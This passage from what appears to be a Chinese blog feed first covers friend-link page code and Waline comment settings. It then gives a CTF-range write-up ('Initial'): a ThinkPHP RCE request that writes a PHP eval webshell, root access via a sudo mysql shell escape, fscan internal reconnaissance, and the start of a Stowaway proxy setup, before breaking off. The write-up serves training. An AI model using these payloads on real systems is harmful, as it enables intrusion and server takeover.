class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.avatar-wrap</span>&#123;<span class="attribute">position</span>:relative;<span class="attribute">border-radius</span>:<span class="number">12px</span>;<span class="attribute">overflow</span>:hidden;aspect-ratio:<span class="number">1</span>/<span class="number">1</span>&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.avatar-wrap</span> <span class="selector-tag">img</span>&#123;<span class="attribute">width</span>:<span class="number">100%</span>;<span class="attribute">height</span>:<span class="number">100%</span>;<span class="attribute">object-fit</span>:cover;<span class="attribute">display</span>:block&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.avatar-wrap</span> <span class="selector-class">.desc</span>&#123;<span class="attribute">position</span>:absolute;<span class="attribute">left</span>:<span class="number">0</span>;<span class="attribute">right</span>:<span class="number">0</span>;<span class="attribute">bottom</span>:<span class="number">0</span>;<span class="attribute">transform</span>:<span class="built_in">translateY</span>(<span class="number">100%</span>);<span class="attribute">padding</span>:<span class="number">10px</span> <span class="number">12px</span>;<span class="attribute">background</span>:<span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">72</span>);<span class="attribute">color</span>:<span class="number">#fff</span>;<span class="attribute">font-size</span>:.<span class="number">875rem</span>;<span class="attribute">line-height</span>:<span class="number">1.35</span>;<span class="attribute">transition</span>:transform .<span class="number">2s</span> ease;<span class="attribute">pointer-events</span>:none&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.avatar-wrap</span><span class="selector-class">.reveal</span> <span class="selector-class">.desc</span>&#123;<span class="attribute">transform</span>:<span class="built_in">translateY</span>(<span class="number">0</span>)&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.meta</span>&#123;<span class="attribute">padding-top</span>:<span class="number">8px</span>&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.name</span>&#123;<span class="attribute">font-weight</span>:<span class="number">600</span>;<span class="attribute">white-space</span>:nowrap;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-overflow</span>:ellipsis&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.post-title</span>&#123;<span class="attribute">display</span>:none<span class="meta">!important</span>&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="variable constant_">LINKS_DATA</span>=[&#123;<span class="attr">links_category</span>:<span class="string">&quot;Team&quot;</span>,<span class="attr">list</span>:[&#123;<span class="attr">name</span>:<span class="string">&quot;su-team&quot;</span>,<span class="attr">link</span>:<span class="string">&quot;https://su-team.cn/&quot;</span>,<span class="attr">description</span>:<span class="string">&quot;不止是CTF！&quot;</span>,<span class="attr">avatar</span>:<span class="string">&quot;https://baozongwi.xyz/images/su_logo/SU4.jpg&quot;</span>&#125;]&#125;,&#123;<span class="attr">links_category</span>:<span class="string">&quot;friends🤩&quot;</span>,<span class="attr">list</span>:[&#123;<span class="attr">name</span>:<span class="string">&quot;fushuling&quot;</span>,<span class="attr">link</span>:<span class="string">&quot;https://fushuling.com/&quot;</span>,<span class="attr">description</span>:<span class="string">&quot;带我进SU的好哥哥&quot;</span>,<span class="attr">avatar</span>:<span class="string">&quot;https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2022/08/QQ%E5%9B%BE%E7%89%8720220812001845.jpg&quot;</span>&#125;,&#123;<span class="attr">name</span>:<span class="string">&quot;Y4tacker&quot;</span>,<span class="attr">link</span>:<span class="string">&quot;https://y4tacker.github.io/&quot;</span>,<span class="attr">description</span>:<span class="string">&quot;Y4师傅诶~&quot;</span>,<span class="attr">avatar</span>:<span class="string">&quot;https://y4tacker.github.io/images/me.jpeg&quot;</span>&#125;]&#125;];</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="title function_">escapeHTML</span>=(<span class="params">s</span>)=&gt;<span class="title class_">String</span>(s).<span class="title function_">replace</span>(<span class="regexp">/[&amp;&lt;&gt;&quot;&#x27;]/g</span>,<span class="function">(<span class="params">m</span>)=&gt;</span>(&#123;<span class="string">&#x27;&amp;&#x27;</span>:<span class="string">&#x27;&amp;amp;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>:<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>:<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>:<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>:<span class="string">&#x27;&amp;#39;&#x27;</span>&#125;[m]));</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">shuffle</span>(<span class="params">arr</span>)&#123;<span class="keyword">for</span>(<span class="keyword">let</span> i=arr.<span class="property">length</span>-<span class="number">1</span>;i&gt;<span class="number">0</span>;i--)&#123;<span class="keyword">const</span> j=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*(i+<span class="number">1</span>));[arr[i],arr[j]]=[arr[j],arr[i]]&#125;<span class="keyword">return</span> arr&#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">createCard</span>(<span class="params">item</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> a=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    a.<span class="property">className</span>=<span class="string">&#x27;friend-card&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    a.<span class="property">href</span>=item.<span class="property">link</span>;</span></span><br><span class="line"><span class="language-javascript">    a.<span class="property">target</span>=<span class="string">&#x27;_blank&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    a.<span class="property">rel</span>=<span class="string">&#x27;noopener noreferrer&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    a.<span class="title function_">setAttribute</span>(<span class="string">&#x27;aria-label&#x27;</span>,<span class="string">`<span class="subst">$&#123;item.name&#125;</span> - <span class="subst">$&#123;item.description||<span class="string">&#x27;&#x27;</span>&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">    a.<span class="property">innerHTML</span>=<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;div class=&quot;avatar-wrap&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;img src=&quot;<span class="subst">$&#123;escapeHTML(item.avatar)&#125;</span>&quot; alt=&quot;<span class="subst">$&#123;escapeHTML(item.name)&#125;</span> avatar&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;div class=&quot;desc&quot; aria-hidden=&quot;true&quot;&gt;<span class="subst">$&#123;escapeHTML(item.description||<span class="string">&#x27;&#x27;</span>)&#125;</span>&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;div class=&quot;meta&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;div class=&quot;name&quot; title=&quot;<span class="subst">$&#123;escapeHTML(item.name)&#125;</span>&quot;&gt;<span class="subst">$&#123;escapeHTML(item.name)&#125;</span>&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    `</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> wrap=a.<span class="title function_">querySelector</span>(<span class="string">&#x27;.avatar-wrap&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> shownOnce=<span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    wrap.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>,<span class="function">()=&gt;</span>&#123;<span class="keyword">if</span>(!shownOnce)&#123;wrap.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;reveal&#x27;</span>);shownOnce=<span class="literal">true</span>&#125;&#125;);</span></span><br><span class="line"><span class="language-javascript">    wrap.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>,<span class="function">()=&gt;</span>&#123;wrap.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;reveal&#x27;</span>);shownOnce=<span class="literal">false</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">    wrap.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchstart&#x27;</span>,<span class="function">(<span class="params">e</span>)=&gt;</span>&#123;e.<span class="title function_">preventDefault</span>();<span class="keyword">const</span> willShow=!wrap.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;reveal&#x27;</span>);wrap.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;reveal&#x27;</span>,willShow);shownOnce=willShow&#125;,&#123;<span class="attr">passive</span>:<span class="literal">false</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">    a.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;error&#x27;</span>,<span class="function">(<span class="params">ev</span>)=&gt;</span>&#123;ev.<span class="property">target</span>.<span class="property">src</span>=<span class="string">&#x27;data:image/svg+xml;utf8,&#x27;</span>+<span class="built_in">encodeURIComponent</span>(<span class="string">`&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;&lt;rect width=&quot;100%&quot; height=&quot;100%&quot; fill=&quot;#ddd&quot;/&gt;&lt;text x=&quot;50%&quot; y=&quot;50%&quot; dominant-baseline=&quot;middle&quot; text-anchor=&quot;middle&quot; fill=&quot;#555&quot; font-size=&quot;22&quot;&gt;<span class="subst">$&#123;escapeHTML(item.name)&#125;</span>&lt;/text&gt;&lt;/svg&gt;`</span>)&#125;);<span class="keyword">return</span> a&#125;</span></span><br><span class="line"><span class="language-javascript">  (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> root=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;links-root&#x27;</span>);<span class="keyword">if</span>(!root)<span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable constant_">LINKS_DATA</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">cat</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> section=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;section&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      section.<span class="property">className</span>=<span class="string">&#x27;links-category&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      section.<span class="property">innerHTML</span>=<span class="string">`&lt;h2&gt;<span class="subst">$&#123;escapeHTML(cat.links_category)&#125;</span>&lt;/h2&gt;&lt;div class=&quot;links-grid&quot;&gt;&lt;/div&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> grid=section.<span class="title function_">querySelector</span>(<span class="string">&#x27;.links-grid&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">shuffle</span>(cat.<span class="property">list</span>.<span class="title function_">slice</span>()).<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span>=&gt;</span>grid.<span class="title function_">appendChild</span>(<span class="title function_">createCard</span>(item)));</span></span><br><span class="line"><span class="language-javascript">      root.<span class="title function_">appendChild</span>(section);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;)();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure><p>直接把上面的代码放进去就可以了，页面就做好了，再自己把收集的友链信息放进去，效果图如下（非常满意）</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/PixPin_2025-08-10_11-27-18.gif" alt="1"></p><p>不过我发现了这样子之后博客加载速度会慢一些，所以我选择学习陆队，简约一点，直接放，用python脚本处理yml文件生成md表格</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,yaml</span><br><span class="line"><span class="keyword">from</span> pypinyin <span class="keyword">import</span> lazy_pinyin</span><br><span class="line">p=sys.argv[<span class="number">1</span>]<span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span> <span class="keyword">else</span><span class="string">&quot;_data/links.yml&quot;</span></span><br><span class="line">d=yaml.safe_load(<span class="built_in">open</span>(p,encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">e=<span class="keyword">lambda</span> s:(s <span class="keyword">or</span><span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;|&quot;</span>,<span class="string">r&quot;\|&quot;</span>).strip()</span><br><span class="line">k=<span class="keyword">lambda</span> n:(<span class="number">1</span>,s)<span class="keyword">if</span>(s:=<span class="string">&#x27;&#x27;</span>.join(lazy_pinyin((n <span class="keyword">or</span><span class="string">&quot;&quot;</span>).strip())).lower())[<span class="number">0</span>].isdigit()<span class="keyword">else</span>(<span class="number">0</span>,s)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;| Group | Name | Link |\n| --- | --- | --- |&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> d <span class="keyword">or</span>[]:</span><br><span class="line">    g=e(b.get(<span class="string">&quot;links_category&quot;</span>,<span class="string">&quot;&quot;</span>));f=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">sorted</span>(b.get(<span class="string">&quot;list&quot;</span>,[]),key=<span class="keyword">lambda</span> x:k(x.get(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&quot;</span>))):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;| <span class="subst">&#123;g <span class="keyword">if</span> f <span class="keyword">else</span><span class="string">&#x27;&#x27;</span>&#125;</span> | <span class="subst">&#123;e(i.get(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;&#x27;</span>))&#125;</span> | <span class="subst">&#123;e(i.get(<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;&#x27;</span>))&#125;</span> |&quot;</span>);f=<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="waline评论"><a href="#waline评论" class="headerlink" title="waline评论"></a>waline评论</h2><p>最经典的了，每次我都会弄这个，next主题的话需要安装一个插件，再直接把配置项加到<code>next/_config.yml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install @waline/hexo-next</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Multiple Comment System Support</span></span><br><span class="line"><span class="attr">comments:</span></span><br><span class="line">  <span class="comment"># Available values: tabs | buttons</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">tabs</span></span><br><span class="line">  <span class="comment"># Choose a comment system to be displayed by default.</span></span><br><span class="line">  <span class="comment"># Available values: disqus | disqusjs | changyan | livere | gitalk | utterances</span></span><br><span class="line">  <span class="attr">active:</span></span><br><span class="line">  <span class="comment"># Setting `true` means remembering the comment system selected by the visitor.</span></span><br><span class="line">  <span class="attr">storage:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Lazyload all comment systems.</span></span><br><span class="line">  <span class="attr">lazyload:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Modify texts or order for any naves, here are some examples.</span></span><br><span class="line">  <span class="attr">nav:</span></span><br><span class="line">    <span class="comment">#disqus:</span></span><br><span class="line">    <span class="comment">#  text: Load Disqus</span></span><br><span class="line">    <span class="comment">#  order: -1</span></span><br><span class="line">    <span class="comment">#gitalk:</span></span><br><span class="line">    <span class="comment">#  order: -2</span></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="comment"># 添加的部分   </span></span><br><span class="line"><span class="attr">waline:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">serverURL:</span> <span class="string">&#x27;https://waline.baozongwi.xyz/&#x27;</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">&#x27;mm&#x27;</span></span><br><span class="line">  <span class="attr">meta:</span> [<span class="string">&#x27;nick&#x27;</span>,<span class="string">&#x27;mail&#x27;</span>]</span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">lang:</span> <span class="string">&#x27;zh-CN&#x27;</span></span><br><span class="line">  <span class="attr">visitor:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">comment_count:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">requiredFields:</span> [<span class="string">&#x27;nick&#x27;</span>,<span class="string">&#x27;mail&#x27;</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">搜索bug修复、友链新增、waline评论</summary>
    
    
    
    <category term="talk" scheme="https://baozongwi.xyz/categories/talk/"/>
    
    
  </entry>
  
  <entry>
    <title>春秋云镜Initial</title>
    <link href="https://baozongwi.xyz/posts/4207.html"/>
    <id>https://baozongwi.xyz/posts/4207.html</id>
    <published>2025-08-09T13:49:36.000Z</published>
    <updated>2025-08-09T14:33:34.309Z</updated>
    
    <content type="html"><![CDATA[<p>接下来的日子，博客会多一些春秋云镜的靶场wp，我会尽可能的写清楚，而不是写详细，我看过很多网上的WriteUp，他们大部分只说了步骤，但是从未提及为何</p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>看到网站logo为thinkphp的logo，</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/1.png" alt="1"></p><p>NDAY，发现可以直接RCE，运行<code>curl ip.sb</code>发现出网，可以弹shell，也可以写马，这里选择写马</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.99.234.190</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://39.99.234.190/index.php?s=captcha</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://39.99.234.190</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>84</span><br><span class="line"></span><br><span class="line"><span class="language-oxygene">_method=__construct&amp;filter%<span class="number">5</span>B%<span class="number">5</span>D=system&amp;<span class="keyword">method</span>=<span class="title function_">get</span>&amp;<span class="title function_">server</span>%5<span class="title function_">BREQUEST_METHOD</span>%5<span class="title function_">D</span>=<span class="title function_">echo</span> <span class="title function_">PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4</span>=|<span class="title function_">base64</span> -<span class="title function_">d</span> &gt; <span class="title function_">shell</span>.<span class="title function_">php</span></span></span><br></pre></td></tr></table></figure><p>查看flag权限不够，sudo提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on ubuntu-web01:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">User www-data may run the following commands on ubuntu-web01:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! find / -name flag*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! tac /root/flag/flag01.txt&#x27;</span></span><br><span class="line">flag01: flag&#123;60b53231-</span><br></pre></td></tr></table></figure><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>上传fscan进行内网信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/tmp) $ ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe37:19b9  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:37:19:b9  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 400609  bytes 182951339 (182.9 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 314801  bytes 33381424 (33.3 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 1094  bytes 96715 (96.7 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 1094  bytes 96715 (96.7 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>./fscan -h 172.22.1.15/24</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target 172.22.1.2      is alive</span><br><span class="line">(icmp) Target 172.22.1.15     is alive</span><br><span class="line">(icmp) Target 172.22.1.21     is alive</span><br><span class="line">(icmp) Target 172.22.1.18     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.15:10010 open</span><br><span class="line">[*] alive ports len is: 15</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[+] MS17-010 172.22.1.21        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] OsInfo 172.22.1.2   (Windows Server 2016 Datacenter 14393)                                                                                                                                                    </span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure><p>整理一下信息</p><ul><li>172.22.1.21  XIAORANG-WIN7.xiaorang.lab  MS17-010</li><li>172.22.1.18  XIAORANG-OA01.xiaorang.lab(信呼OA)</li><li>172.22.1.15  已经被控 </li><li>172.22.1.2  DC01.xiaorang.lab</li></ul><p>使用<strong>stowaway</strong>搭建内网代理 <a href="https://github.com/ph4ntonn/Stowaway/releases/tag/v2.2">https://github.com/ph4ntonn/Stowaway/releases/tag/v2.2</a> 搭建反向代理，把<code>admin</code>放在服务器上面，<code>agent</code>放在靶机上面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 